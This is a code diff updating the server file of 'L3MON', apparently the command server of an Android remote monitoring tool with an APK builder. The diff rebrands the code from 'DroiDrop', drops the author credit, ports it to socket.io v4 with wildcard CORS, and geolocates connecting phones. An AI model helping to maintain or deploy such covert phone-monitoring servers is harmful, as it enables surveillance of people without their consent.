@@ -1,7 +1,6 @@
 /* 
-*   DroiDrop
+*   L3MON
 *   An Android Monitoring Tool
-*   By VoidTyphoon.co.uk
 */
 
 console.log('Server Started! \nhttp://localhost:22533');
@@ -9,7 +8,8 @@ console.log('Server Started! \nhttp://localhost:22533');
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    http = require('http').createServer(app),
+    { Server } = require('socket.io'),
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
@@ -24,16 +24,18 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// spin up socket server (socket.io v4 API)
+let client_io = new Server(CONST.control_port, {
+    cors: { origin: '*' },
+    pingInterval: 30000
+});
 
-client_io.sockets.pingInterval = 30000;
 client_io.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
-    let clientAddress = socket.request.connection;
 
-    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
+    // socket.request.connection removed in socket.io v4 — use handshake.address
+    let clientIP = (socket.handshake.address || '').replace(/^.*:/, '') || 'unknown';
     let clientGeo = geoip.lookup(clientIP);
     if (!clientGeo) clientGeo = {}
 
@@ -48,20 +50,11 @@ client_io.on('connection', (socket) => {
     });
 
     if (CONST.debug) {
-        var onevent = socket.onevent;
-        socket.onevent = function (packet) {
-            var args = packet.data || [];
-            onevent.call(this, packet);    // original call
-            packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
-        };
-
-        socket.on("*", function (event, data) {
+        socket.onAny((event, data) => {
             console.log(event);
             console.log(data);
         });
     }
-
 });
 
 
@@ -72,3 +65,4 @@ app.set('view engine', 'ejs');
 app.set('views', './assets/views');
 app.use(express.static(__dirname + '/assets/webpublic'));
 app.use(require('./includes/expressRoutes'));
+
